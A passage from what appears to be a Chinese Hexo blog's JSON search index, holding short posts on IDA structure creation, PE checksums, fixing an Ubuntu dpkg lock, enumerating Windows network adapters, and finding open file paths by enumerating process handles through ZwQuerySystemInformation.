物理层：将二进制数据转换为电信号通过网卡通过网线进行传输。","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"IDA创建结构体","slug":"IDA创建结构体","date":"2018-04-11T16:00:00.000Z","updated":"2023-07-27T14:34:42.222Z","comments":true,"path":"2018/04/12/IDA创建结构体/","link":"","permalink":"http://zwjsfdbb.top/2018/04/12/IDA%E5%88%9B%E5%BB%BA%E7%BB%93%E6%9E%84%E4%BD%93/","excerpt":"1.在IDA中打开Structures，快捷键是shifr+ F9 ,然后按insert键，进行插入 2.在ends 后按d键，添加相应的成员，然后选中成员名，按N进行修改，选中类型，按d 进行更改类型，构造完结构题以后，回到代码窗口 3 在代码窗口找到相应的变量，右键选择Convert to struct ，然后选择刚刚你定义的结构体即可。","text":"1.在IDA中打开Structures，快捷键是shifr+ F9 ,然后按insert键，进行插入 2.在ends 后按d键，添加相应的成员，然后选中成员名，按N进行修改，选中类型，按d 进行更改类型，构造完结构题以后，回到代码窗口 3 在代码窗口找到相应的变量，右键选择Convert to struct ，然后选择刚刚你定义的结构体即可。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"PE Checksum","slug":"PE Checksum","date":"2018-04-11T16:00:00.000Z","updated":"2023-07-27T14:37:18.770Z","comments":true,"path":"2018/04/12/PE Checksum/","link":"","permalink":"http://zwjsfdbb.top/2018/04/12/PE%20Checksum/","excerpt":"1.check 介绍PE文件可选头结构如下，其中有个成员是checksum ，其在编译以后生成一个校验和，所有驱动、系统启动时加载的DLL、系统关键进程加载的DLL都要进行校验和的校验，查看是否有改动，这个检验和可以通过API进行计算，CheckSumMappedFile 或者直接 MapFileAndCheckSum，计算算法比较简单如下： 因为要计算整个文件数据嘛，所以开始这个字段的数据要先置0； 从文件头开始，每次读一个字（WORD），进行带进位的累加（ADC），超出WORD部分自动溢出； 将前面的累加和再加上PE文件的长度，结果就是这个校验和了 2 测试代码如下：#include&quot;stdafx.h&quot; #include &lt;windows.h&gt; #include&lt;ImageHlp.h&gt; #pragma comment(lib,&quot;ImageHlp.lib&quot;) ​ void main() &#123; DWORD HeaderCheckSum = 0; //PE头里的校验值 DWORD CheckSum = 0; //计算下来的校验值 MapFileAndCheckSum(L&quot;D:\\\\newupdate.exe&quot;, &amp;HeaderCheckSum, &amp;CheckSum); if (CheckSum == HeaderCheckSum) &#123; MessageBox(NULL, L&quot;相等&quot;, NULL, 0); &#125; &#125; 附PE可选头结构typedef struct _IMAGE_OPTIONAL_HEADER{ &#x2F;&#x2F; &#x2F;&#x2F; Standard fields. &#x2F;&#x2F;+18h WORD Magic; &#x2F;&#x2F; 标志字, ROM 映像（0107h）,普通可执行文件（010Bh）+1Ah BYTE MajorLinkerVersion; &#x2F;&#x2F; 链接程序的主版本号+1Bh BYTE MinorLinkerVersion; &#x2F;&#x2F; 链接程序的次版本号+1Ch DWORD SizeOfCode; &#x2F;&#x2F; 所有含代码的节的总大小+20h DWORD SizeOfInitializedData; &#x2F;&#x2F; 所有含已初始化数据的节的总大小+24h DWORD SizeOfUninitializedData; &#x2F;&#x2F; 所有含未初始化数据的节的大小+28h DWORD AddressOfEntryPoint; &#x2F;&#x2F; 程序执行入口RVA+2Ch DWORD BaseOfCode; &#x2F;&#x2F; 代码的区块的起始RVA+30h DWORD BaseOfData; &#x2F;&#x2F; 数据的区块的起始RVA &#x2F;&#x2F; &#x2F;&#x2F; NT additional fields. 以下是属于NT结构增加的领域。 &#x2F;&#x2F;+34h DWORD ImageBase; &#x2F;&#x2F; 程序的首选装载地址+38h DWORD SectionAlignment; &#x2F;&#x2F; 内存中的区块的对齐大小+3Ch DWORD FileAlignment; &#x2F;&#x2F; 文件中的区块的对齐大小+40h WORD MajorOperatingSystemVersion; &#x2F;&#x2F; 要求操作系统最低版本号的主版本号+42h WORD MinorOperatingSystemVersion; &#x2F;&#x2F; 要求操作系统最低版本号的副版本号+44h WORD MajorImageVersion; &#x2F;&#x2F; 可运行于操作系统的主版本号+46h WORD MinorImageVersion; &#x2F;&#x2F; 可运行于操作系统的次版本号+48h WORD MajorSubsystemVersion; &#x2F;&#x2F; 要求最低子系统版本的主版本号+4Ah WORD MinorSubsystemVersion; &#x2F;&#x2F; 要求最低子系统版本的次版本号+4Ch DWORD Win32VersionValue; &#x2F;&#x2F; 莫须有字段，不被病毒利用的话一般为0+50h DWORD SizeOfImage; &#x2F;&#x2F; 映像装入内存后的总尺寸+54h DWORD SizeOfHeaders; &#x2F;&#x2F; 所有头 + 区块表的尺寸大小+58h DWORD CheckSum; &#x2F;&#x2F; 映像的校检和+5Ch WORD Subsystem; &#x2F;&#x2F; 可执行文件期望的子系统+5Eh WORD DllCharacteristics; &#x2F;&#x2F; DllMain()函数何时被调用，默认为 0+60h DWORD SizeOfStackReserve; &#x2F;&#x2F; 初始化时的栈大小+64h DWORD SizeOfStackCommit; &#x2F;&#x2F; 初始化时实际提交的栈大小+68h DWORD SizeOfHeapReserve; &#x2F;&#x2F; 初始化时保留的堆大小+6Ch DWORD SizeOfHeapCommit; &#x2F;&#x2F; 初始化时实际提交的堆大小+70h DWORD LoaderFlags; &#x2F;&#x2F; 与调试有关，默认为 0+74h DWORD NumberOfRvaAndSizes; &#x2F;&#x2F; 下边数据目录的项数，这个字段自Windows NT 发布以来 &#x2F;&#x2F; 一直是16+78h IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; &#x2F;&#x2F; 数据目录表} IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;","text":"1.check 介绍PE文件可选头结构如下，其中有个成员是checksum ，其在编译以后生成一个校验和，所有驱动、系统启动时加载的DLL、系统关键进程加载的DLL都要进行校验和的校验，查看是否有改动，这个检验和可以通过API进行计算，CheckSumMappedFile 或者直接 MapFileAndCheckSum，计算算法比较简单如下： 因为要计算整个文件数据嘛，所以开始这个字段的数据要先置0； 从文件头开始，每次读一个字（WORD），进行带进位的累加（ADC），超出WORD部分自动溢出； 将前面的累加和再加上PE文件的长度，结果就是这个校验和了 2 测试代码如下：#include&quot;stdafx.h&quot; #include &lt;windows.h&gt; #include&lt;ImageHlp.h&gt; #pragma comment(lib,&quot;ImageHlp.lib&quot;) ​ void main() &#123; DWORD HeaderCheckSum = 0; //PE头里的校验值 DWORD CheckSum = 0; //计算下来的校验值 MapFileAndCheckSum(L&quot;D:\\\\newupdate.exe&quot;, &amp;HeaderCheckSum, &amp;CheckSum); if (CheckSum == HeaderCheckSum) &#123; MessageBox(NULL, L&quot;相等&quot;, NULL, 0); &#125; &#125; 附PE可选头结构typedef struct _IMAGE_OPTIONAL_HEADER{ &#x2F;&#x2F; &#x2F;&#x2F; Standard fields. &#x2F;&#x2F;+18h WORD Magic; &#x2F;&#x2F; 标志字, ROM 映像（0107h）,普通可执行文件（010Bh）+1Ah BYTE MajorLinkerVersion; &#x2F;&#x2F; 链接程序的主版本号+1Bh BYTE MinorLinkerVersion; &#x2F;&#x2F; 链接程序的次版本号+1Ch DWORD SizeOfCode; &#x2F;&#x2F; 所有含代码的节的总大小+20h DWORD SizeOfInitializedData; &#x2F;&#x2F; 所有含已初始化数据的节的总大小+24h DWORD SizeOfUninitializedData; &#x2F;&#x2F; 所有含未初始化数据的节的大小+28h DWORD AddressOfEntryPoint; &#x2F;&#x2F; 程序执行入口RVA+2Ch DWORD BaseOfCode; &#x2F;&#x2F; 代码的区块的起始RVA+30h DWORD BaseOfData; &#x2F;&#x2F; 数据的区块的起始RVA &#x2F;&#x2F; &#x2F;&#x2F; NT additional fields. 以下是属于NT结构增加的领域。 &#x2F;&#x2F;+34h DWORD ImageBase; &#x2F;&#x2F; 程序的首选装载地址+38h DWORD SectionAlignment; &#x2F;&#x2F; 内存中的区块的对齐大小+3Ch DWORD FileAlignment; &#x2F;&#x2F; 文件中的区块的对齐大小+40h WORD MajorOperatingSystemVersion; &#x2F;&#x2F; 要求操作系统最低版本号的主版本号+42h WORD MinorOperatingSystemVersion; &#x2F;&#x2F; 要求操作系统最低版本号的副版本号+44h WORD MajorImageVersion; &#x2F;&#x2F; 可运行于操作系统的主版本号+46h WORD MinorImageVersion; &#x2F;&#x2F; 可运行于操作系统的次版本号+48h WORD MajorSubsystemVersion; &#x2F;&#x2F; 要求最低子系统版本的主版本号+4Ah WORD MinorSubsystemVersion; &#x2F;&#x2F; 要求最低子系统版本的次版本号+4Ch DWORD Win32VersionValue; &#x2F;&#x2F; 莫须有字段，不被病毒利用的话一般为0+50h DWORD SizeOfImage; &#x2F;&#x2F; 映像装入内存后的总尺寸+54h DWORD SizeOfHeaders; &#x2F;&#x2F; 所有头 + 区块表的尺寸大小+58h DWORD CheckSum; &#x2F;&#x2F; 映像的校检和+5Ch WORD Subsystem; &#x2F;&#x2F; 可执行文件期望的子系统+5Eh WORD DllCharacteristics; &#x2F;&#x2F; DllMain()函数何时被调用，默认为 0+60h DWORD SizeOfStackReserve; &#x2F;&#x2F; 初始化时的栈大小+64h DWORD SizeOfStackCommit; &#x2F;&#x2F; 初始化时实际提交的栈大小+68h DWORD SizeOfHeapReserve; &#x2F;&#x2F; 初始化时保留的堆大小+6Ch DWORD SizeOfHeapCommit; &#x2F;&#x2F; 初始化时实际提交的堆大小+70h DWORD LoaderFlags; &#x2F;&#x2F; 与调试有关，默认为 0+74h DWORD NumberOfRvaAndSizes; &#x2F;&#x2F; 下边数据目录的项数，这个字段自Windows NT 发布以来 &#x2F;&#x2F; 一直是16+78h IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; &#x2F;&#x2F; 数据目录表} IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"ubuntu 无法安装软件","slug":"ubuntu 无法安装软件","date":"2018-04-11T16:00:00.000Z","updated":"2023-07-04T14:39:37.067Z","comments":true,"path":"2018/04/12/ubuntu 无法安装软件/","link":"","permalink":"http://zwjsfdbb.top/2018/04/12/ubuntu%20%E6%97%A0%E6%B3%95%E5%AE%89%E8%A3%85%E8%BD%AF%E4%BB%B6/","excerpt":"问题描述apt-get install package 时出现以下问题 E: Could not get lock &#x2F;var&#x2F;lib&#x2F;dpkg&#x2F;lock - open (11: Resource temporarily unavailable)E: Unable to lock the administration directory (&#x2F;var&#x2F;lib&#x2F;dpkg&#x2F;), is another process using it? 解决办法： sudo rm &#x2F;var&#x2F;lib&#x2F;dpkg&#x2F;lock sudo dpkg –configure -a","text":"问题描述apt-get install package 时出现以下问题 E: Could not get lock &#x2F;var&#x2F;lib&#x2F;dpkg&#x2F;lock - open (11: Resource temporarily unavailable)E: Unable to lock the administration directory (&#x2F;var&#x2F;lib&#x2F;dpkg&#x2F;), is another process using it? 解决办法： sudo rm &#x2F;var&#x2F;lib&#x2F;dpkg&#x2F;lock sudo dpkg –configure -a","categories":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/categories/%E6%9D%82%E5%AD%A6/"}],"tags":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/tags/%E6%9D%82%E5%AD%A6/"}]},{"title":"windows 更新以后无法定位msvcp_win.dll","slug":"windows 更新以后无法定位msvcp_win.dll","date":"2018-04-11T16:00:00.000Z","updated":"2023-07-04T14:13:20.453Z","comments":true,"path":"2018/04/12/windows 更新以后无法定位msvcp_win.dll/","link":"","permalink":"http://zwjsfdbb.top/2018/04/12/windows%20%E6%9B%B4%E6%96%B0%E4%BB%A5%E5%90%8E%E6%97%A0%E6%B3%95%E5%AE%9A%E4%BD%8Dmsvcp_win.dll/","excerpt":"问题描述：win10更新以后出现 无法定位程序输入点_uncaught_exceptions 于动态链接库 C:\\windows\\system32\\msvcp_win.dll上。 解决办法：命令行下：输入sfc &#x2F;scannow","text":"问题描述：win10更新以后出现 无法定位程序输入点_uncaught_exceptions 于动态链接库 C:\\windows\\system32\\msvcp_win.dll上。 解决办法：命令行下：输入sfc &#x2F;scannow","categories":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/categories/%E6%9D%82%E5%AD%A6/"}],"tags":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/tags/%E6%9D%82%E5%AD%A6/"}]},{"title":"windows 编程获取网卡和ip","slug":"windows 编程获取网卡和ip","date":"2018-04-11T16:00:00.000Z","updated":"2023-07-27T14:37:56.363Z","comments":true,"path":"2018/04/12/windows 编程获取网卡和ip/","link":"","permalink":"http://zwjsfdbb.top/2018/04/12/windows%20%E7%BC%96%E7%A8%8B%E8%8E%B7%E5%8F%96%E7%BD%91%E5%8D%A1%E5%92%8Cip/","excerpt":"一台机器上可能不只有一个网卡，但每一个网卡只有一个MAC地址，而每一个网卡可能配置有多个IP地址；如平常的笔记本电脑中，就会有无线网卡和有线网卡（网线接口）两种；因此，如果要获得本机所有网卡的IP和MAC地址信息，则必须顺序获得每个网卡，再依次获取其信息等；在windows sdk中，用IP_ADAPTER_INFO结构体存储网卡信息，包括网卡名、网卡描述、网卡MAC地址、网卡IP等，该结构体的主要描述如下所示： typedef struct _IP_ADAPTER_INFO &#123; struct _IP_ADAPTER_INFO* Next;//指向链表中下一个适配器信息的指针 DWORD ComboIndex;//预留值 char AdapterName[MAX_ADAPTER_NAME_LENGTH + 4];//使用ANSI字符串表示的适配器名称 char Description[MAX_ADAPTER_DESCRIPTION_LENGTH + 4];//使用ANSI字符串表示的适配器描述 UINT AddressLength;//适配器硬件地址以字节计算的长度 BYTE Address[MAX_ADAPTER_ADDRESS_LENGTH];//硬件地址以BYTE数组所表示 DWORD Index;//适配器索引 UINT Type;//适配器类型,主要有以下几种： /* * MIB_IF_TYPE_OTHER 1 * MIB_IF_TYPE_ETHERNET 6 * MIB_IF_TYPE_TOKENRING 9 * MIB_IF_TYPE_FDDI 15 * MIB_IF_TYPE_PPP 23 * MIB_IF_TYPE_LOOPBACK 24 * MIB_IF_TYPE_SLIP 28 */ UINT DhcpEnabled;//指定这个适配器是否开启DHCP PIP_ADDR_STRING CurrentIpAddress;//预留值 IP_ADDR_STRING IpAddressList;//该适配器的IPv4地址链表 IP_ADDR_STRING GatewayList;//该适配器的网关IPv4地址链表 IP_ADDR_STRING DhcpServer;//该适配器的DHCP服务器的IPv4 地址链表 BOOL HaveWins; IP_ADDR_STRING PrimaryWinsServer; IP_ADDR_STRING SecondaryWinsServer; time_t LeaseObtained; time_t LeaseExpires; &#125; IP_ADAPTER_INFO,*PIP_ADAPTER_INFO; 由于可能有多个网卡，因此struct _IP_ADAPTER_INFO* Next字段为一个链表结构指针，由于一个网卡可能有多个IP，因此IP_ADDR_STRING字段应该也是一个链表结构，其信息如下所示： typedef struct _IP_ADDR_STRING &#123; struct _IP_ADDR_STRING* Next; //指向同类型节点，即下一个IP（如果有多IP的话） IP_ADDRESS_STRING IpAddress; //IP地址信息 IP_MASK_STRING IpMask; //IP子网掩码 DWORD Context;// 网络表入口。这个值对应着AddIPAddredd和DeleteIPAddress函数中的NTEContext参数 &#125; IP_ADDR_STRING; 在基本了解以上信息后，就可以调用GetAdaptersInfo函数来获取相关网卡信息了，其通用的代码如下所示： #include &lt;WinSock2.h&gt; #include &lt;Iphlpapi.h&gt; #include &lt;iostream&gt; using namespace std; #pragma comment(lib,&quot;Iphlpapi.lib&quot;) //需要添加Iphlpapi.lib库 int main(int argc, char* argv[]) &#123; //PIP_ADAPTER_INFO结构体指针存储本机网卡信息 PIP_ADAPTER_INFO pIpAdapterInfo = new IP_ADAPTER_INFO(); //得到结构体大小,用于GetAdaptersInfo参数 unsigned long stSize = sizeof(IP_ADAPTER_INFO); //调用GetAdaptersInfo函数,填充pIpAdapterInfo指针变量;其中stSize参数既是一个输入量也是一个输出量 int nRel = GetAdaptersInfo(pIpAdapterInfo,&amp;stSize); //记录网卡数量 int netCardNum = 0; //记录每张网卡上的IP地址数量 int IPnumPerNetCard = 0; if (ERROR_BUFFER_OVERFLOW == nRel) &#123; //如果函数返回的是ERROR_BUFFER_OVERFLOW //则说明GetAdaptersInfo参数传递的内存空间不够,同时其传出stSize,表示需要的空间大小 //这也是说明为什么stSize既是一个输入量也是一个输出量 //释放原来的内存空间 delete pIpAdapterInfo; //重新申请内存空间用来存储所有网卡信息 pIpAdapterInfo = (PIP_ADAPTER_INFO)new BYTE[stSize]; //再次调用GetAdaptersInfo函数,填充pIpAdapterInfo指针变量 nRel=GetAdaptersInfo(pIpAdapterInfo,&amp;stSize); &#125; if (ERROR_SUCCESS == nRel) &#123; //输出网卡信息 //可能有多网卡,因此通过循环去判断 while (pIpAdapterInfo) &#123; cout&lt;&lt;&quot;网卡数量：&quot;&lt;&lt;++netCardNum&lt;&lt;endl; cout&lt;&lt;&quot;网卡名称：&quot;&lt;&lt;pIpAdapterInfo-&gt;AdapterName&lt;&lt;endl; cout&lt;&lt;&quot;网卡描述：&quot;&lt;&lt;pIpAdapterInfo-&gt;Description&lt;&lt;endl; switch(pIpAdapterInfo-&gt;Type) &#123; case MIB_IF_TYPE_OTHER: cout&lt;&lt;&quot;网卡类型：&quot;&lt;&lt;&quot;OTHER&quot;&lt;&lt;endl; break; case MIB_IF_TYPE_ETHERNET: cout&lt;&lt;&quot;网卡类型：&quot;&lt;&lt;&quot;ETHERNET&quot;&lt;&lt;endl; break; case MIB_IF_TYPE_TOKENRING: cout&lt;&lt;&quot;网卡类型：&quot;&lt;&lt;&quot;TOKENRING&quot;&lt;&lt;endl; break; case MIB_IF_TYPE_FDDI: cout&lt;&lt;&quot;网卡类型：&quot;&lt;&lt;&quot;FDDI&quot;&lt;&lt;endl; break; case MIB_IF_TYPE_PPP: printf(&quot;PP\\n&quot;); cout&lt;&lt;&quot;网卡类型：&quot;&lt;&lt;&quot;PPP&quot;&lt;&lt;endl; break; case MIB_IF_TYPE_LOOPBACK: cout&lt;&lt;&quot;网卡类型：&quot;&lt;&lt;&quot;LOOPBACK&quot;&lt;&lt;endl; break; case MIB_IF_TYPE_SLIP: cout&lt;&lt;&quot;网卡类型：&quot;&lt;&lt;&quot;SLIP&quot;&lt;&lt;endl; break; default: break; &#125; cout&lt;&lt;&quot;网卡MAC地址：&quot;; for (DWORD i = 0; i &lt; pIpAdapterInfo-&gt;AddressLength; i++) if (i &lt; pIpAdapterInfo-&gt;AddressLength-1) &#123; printf(&quot;%02X-&quot;, pIpAdapterInfo-&gt;Address[i]); &#125; else &#123; printf(&quot;%02X\\n&quot;, pIpAdapterInfo-&gt;Address[i]); &#125; cout&lt;&lt;&quot;网卡IP地址如下：&quot;&lt;&lt;endl; //可能网卡有多IP,因此通过循环去判断 IP_ADDR_STRING *pIpAddrString =&amp;(pIpAdapterInfo-&gt;IpAddressList); do &#123; cout&lt;&lt;&quot;该网卡上的IP数量：&quot;&lt;&lt;++IPnumPerNetCard&lt;&lt;endl; cout&lt;&lt;&quot;IP 地址：&quot;&lt;&lt;pIpAddrString-&gt;IpAddress.String&lt;&lt;endl; cout&lt;&lt;&quot;子网地址：&quot;&lt;&lt;pIpAddrString-&gt;IpMask.String&lt;&lt;endl; cout&lt;&lt;&quot;网关地址：&quot;&lt;&lt;pIpAdapterInfo-&gt;GatewayList.IpAddress.String&lt;&lt;endl; pIpAddrString=pIpAddrString-&gt;Next; &#125; while (pIpAddrString); pIpAdapterInfo = pIpAdapterInfo-&gt;Next; cout&lt;&lt;&quot;--------------------------------------------------------------------&quot;&lt;&lt;endl; &#125; &#125; //释放内存空间 if (pIpAdapterInfo) &#123; delete pIpAdapterInfo; &#125; return 0; &#125;","text":"一台机器上可能不只有一个网卡，但每一个网卡只有一个MAC地址，而每一个网卡可能配置有多个IP地址；如平常的笔记本电脑中，就会有无线网卡和有线网卡（网线接口）两种；因此，如果要获得本机所有网卡的IP和MAC地址信息，则必须顺序获得每个网卡，再依次获取其信息等；在windows sdk中，用IP_ADAPTER_INFO结构体存储网卡信息，包括网卡名、网卡描述、网卡MAC地址、网卡IP等，该结构体的主要描述如下所示： typedef struct _IP_ADAPTER_INFO &#123; struct _IP_ADAPTER_INFO* Next;//指向链表中下一个适配器信息的指针 DWORD ComboIndex;//预留值 char AdapterName[MAX_ADAPTER_NAME_LENGTH + 4];//使用ANSI字符串表示的适配器名称 char Description[MAX_ADAPTER_DESCRIPTION_LENGTH + 4];//使用ANSI字符串表示的适配器描述 UINT AddressLength;//适配器硬件地址以字节计算的长度 BYTE Address[MAX_ADAPTER_ADDRESS_LENGTH];//硬件地址以BYTE数组所表示 DWORD Index;//适配器索引 UINT Type;//适配器类型,主要有以下几种： /* * MIB_IF_TYPE_OTHER 1 * MIB_IF_TYPE_ETHERNET 6 * MIB_IF_TYPE_TOKENRING 9 * MIB_IF_TYPE_FDDI 15 * MIB_IF_TYPE_PPP 23 * MIB_IF_TYPE_LOOPBACK 24 * MIB_IF_TYPE_SLIP 28 */ UINT DhcpEnabled;//指定这个适配器是否开启DHCP PIP_ADDR_STRING CurrentIpAddress;//预留值 IP_ADDR_STRING IpAddressList;//该适配器的IPv4地址链表 IP_ADDR_STRING GatewayList;//该适配器的网关IPv4地址链表 IP_ADDR_STRING DhcpServer;//该适配器的DHCP服务器的IPv4 地址链表 BOOL HaveWins; IP_ADDR_STRING PrimaryWinsServer; IP_ADDR_STRING SecondaryWinsServer; time_t LeaseObtained; time_t LeaseExpires; &#125; IP_ADAPTER_INFO,*PIP_ADAPTER_INFO; 由于可能有多个网卡，因此struct _IP_ADAPTER_INFO* Next字段为一个链表结构指针，由于一个网卡可能有多个IP，因此IP_ADDR_STRING字段应该也是一个链表结构，其信息如下所示： typedef struct _IP_ADDR_STRING &#123; struct _IP_ADDR_STRING* Next; //指向同类型节点，即下一个IP（如果有多IP的话） IP_ADDRESS_STRING IpAddress; //IP地址信息 IP_MASK_STRING IpMask; //IP子网掩码 DWORD Context;// 网络表入口。这个值对应着AddIPAddredd和DeleteIPAddress函数中的NTEContext参数 &#125; IP_ADDR_STRING; 在基本了解以上信息后，就可以调用GetAdaptersInfo函数来获取相关网卡信息了，其通用的代码如下所示： #include &lt;WinSock2.h&gt; #include &lt;Iphlpapi.h&gt; #include &lt;iostream&gt; using namespace std; #pragma comment(lib,&quot;Iphlpapi.lib&quot;) //需要添加Iphlpapi.lib库 int main(int argc, char* argv[]) &#123; //PIP_ADAPTER_INFO结构体指针存储本机网卡信息 PIP_ADAPTER_INFO pIpAdapterInfo = new IP_ADAPTER_INFO(); //得到结构体大小,用于GetAdaptersInfo参数 unsigned long stSize = sizeof(IP_ADAPTER_INFO); //调用GetAdaptersInfo函数,填充pIpAdapterInfo指针变量;其中stSize参数既是一个输入量也是一个输出量 int nRel = GetAdaptersInfo(pIpAdapterInfo,&amp;stSize); //记录网卡数量 int netCardNum = 0; //记录每张网卡上的IP地址数量 int IPnumPerNetCard = 0; if (ERROR_BUFFER_OVERFLOW == nRel) &#123; //如果函数返回的是ERROR_BUFFER_OVERFLOW //则说明GetAdaptersInfo参数传递的内存空间不够,同时其传出stSize,表示需要的空间大小 //这也是说明为什么stSize既是一个输入量也是一个输出量 //释放原来的内存空间 delete pIpAdapterInfo; //重新申请内存空间用来存储所有网卡信息 pIpAdapterInfo = (PIP_ADAPTER_INFO)new BYTE[stSize]; //再次调用GetAdaptersInfo函数,填充pIpAdapterInfo指针变量 nRel=GetAdaptersInfo(pIpAdapterInfo,&amp;stSize); &#125; if (ERROR_SUCCESS == nRel) &#123; //输出网卡信息 //可能有多网卡,因此通过循环去判断 while (pIpAdapterInfo) &#123; cout&lt;&lt;&quot;网卡数量：&quot;&lt;&lt;++netCardNum&lt;&lt;endl; cout&lt;&lt;&quot;网卡名称：&quot;&lt;&lt;pIpAdapterInfo-&gt;AdapterName&lt;&lt;endl; cout&lt;&lt;&quot;网卡描述：&quot;&lt;&lt;pIpAdapterInfo-&gt;Description&lt;&lt;endl; switch(pIpAdapterInfo-&gt;Type) &#123; case MIB_IF_TYPE_OTHER: cout&lt;&lt;&quot;网卡类型：&quot;&lt;&lt;&quot;OTHER&quot;&lt;&lt;endl; break; case MIB_IF_TYPE_ETHERNET: cout&lt;&lt;&quot;网卡类型：&quot;&lt;&lt;&quot;ETHERNET&quot;&lt;&lt;endl; break; case MIB_IF_TYPE_TOKENRING: cout&lt;&lt;&quot;网卡类型：&quot;&lt;&lt;&quot;TOKENRING&quot;&lt;&lt;endl; break; case MIB_IF_TYPE_FDDI: cout&lt;&lt;&quot;网卡类型：&quot;&lt;&lt;&quot;FDDI&quot;&lt;&lt;endl; break; case MIB_IF_TYPE_PPP: printf(&quot;PP\\n&quot;); cout&lt;&lt;&quot;网卡类型：&quot;&lt;&lt;&quot;PPP&quot;&lt;&lt;endl; break; case MIB_IF_TYPE_LOOPBACK: cout&lt;&lt;&quot;网卡类型：&quot;&lt;&lt;&quot;LOOPBACK&quot;&lt;&lt;endl; break; case MIB_IF_TYPE_SLIP: cout&lt;&lt;&quot;网卡类型：&quot;&lt;&lt;&quot;SLIP&quot;&lt;&lt;endl; break; default: break; &#125; cout&lt;&lt;&quot;网卡MAC地址：&quot;; for (DWORD i = 0; i &lt; pIpAdapterInfo-&gt;AddressLength; i++) if (i &lt; pIpAdapterInfo-&gt;AddressLength-1) &#123; printf(&quot;%02X-&quot;, pIpAdapterInfo-&gt;Address[i]); &#125; else &#123; printf(&quot;%02X\\n&quot;, pIpAdapterInfo-&gt;Address[i]); &#125; cout&lt;&lt;&quot;网卡IP地址如下：&quot;&lt;&lt;endl; //可能网卡有多IP,因此通过循环去判断 IP_ADDR_STRING *pIpAddrString =&amp;(pIpAdapterInfo-&gt;IpAddressList); do &#123; cout&lt;&lt;&quot;该网卡上的IP数量：&quot;&lt;&lt;++IPnumPerNetCard&lt;&lt;endl; cout&lt;&lt;&quot;IP 地址：&quot;&lt;&lt;pIpAddrString-&gt;IpAddress.String&lt;&lt;endl; cout&lt;&lt;&quot;子网地址：&quot;&lt;&lt;pIpAddrString-&gt;IpMask.String&lt;&lt;endl; cout&lt;&lt;&quot;网关地址：&quot;&lt;&lt;pIpAdapterInfo-&gt;GatewayList.IpAddress.String&lt;&lt;endl; pIpAddrString=pIpAddrString-&gt;Next; &#125; while (pIpAddrString); pIpAdapterInfo = pIpAdapterInfo-&gt;Next; cout&lt;&lt;&quot;--------------------------------------------------------------------&quot;&lt;&lt;endl; &#125; &#125; //释放内存空间 if (pIpAdapterInfo) &#123; delete pIpAdapterInfo; &#125; return 0; &#125;","categories":[{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/tags/%E7%BC%96%E7%A8%8B/"}]},{"title":"获取打开的文件的全路径（2）","slug":"获取打开的文件的全路径（2)","date":"2018-04-11T16:00:00.000Z","updated":"2023-07-27T14:32:25.669Z","comments":true,"path":"2018/04/12/获取打开的文件的全路径（2)/","link":"","permalink":"http://zwjsfdbb.top/2018/04/12/%E8%8E%B7%E5%8F%96%E6%89%93%E5%BC%80%E7%9A%84%E6%96%87%E4%BB%B6%E7%9A%84%E5%85%A8%E8%B7%AF%E5%BE%84%EF%BC%882)/","excerpt":"1、获取打开文件的全路径（2）搜索进程空间中的所有句柄，获取句柄的文件名即可。 首先遍历进程寻找打开文件的进程，比如 word.exe 和PowerPoint.exe HANDLE hSnapProcess &#x3D; CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (hSnapProcess &#x3D;&#x3D; INVALID_HANDLE_VALUE) { return 1; } PROCESSENTRY32W ProcessEntry; ProcessEntry.dwSize &#x3D; sizeof(ProcessEntry); BOOL bret &#x3D; Process32FirstW(hSnapProcess, &amp;ProcessEntry); WCHAR wszProcessInfo[MAX_PATH] &#x3D; { 0 }; do { WCHAR Name[MAX_PATH] &#x3D; { 0 }; if (!lstrcmp(ProcessEntry.szExeFile, L”POWERPNT.EXE”) | !lstrcmp(ProcessEntry.szExeFile, L”WINWORD.EXE”)) { ……. } 寻找到目标进程以后，获取进程中的句柄 这里利用了未文档化的一个函数 ZwQuerySystemInformation，这是ntdll.dll中的函数 HMODULE hNtDLL = LoadLibrary(L&quot;NTDLL.DLL&quot;); if (!hNtDLL) &#123; return 1; &#125; ZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)GetProcAddress(hNtDLL, &quot;ZwQuerySystemInformation&quot;); typedef NTSTATUS(WINAPI *ZWQUERYSYSTEMINFORMATION)(unsigned long, PVOID, ULONG, PULONG); ZWQUERYSYSTEMINFORMATION ZwQuerySystemInformation; 函数原型如下： NTSTATUS WINAPI ZwQuerySystemInformation( _In_ SYSTEM_INFORMATION_CLASS SystemInformationClass, _Inout_ PVOID SystemInformation, _In_ ULONG SystemInformationLength, _Out_opt_ PULONG ReturnLength ); SYSTEM_INFORMATION_CLASS结构体如下： typedef enum _SYSTEMINFOCLASS &#123; SystemBasicInformation, // 0x002C SystemProcessorInformation, // 0x000C SystemPerformanceInformation, // 0x0138 SystemTimeInformation, // 0x0020 SystemPathInformation, // not implemented SystemProcessInformation, // 0x00C8+ 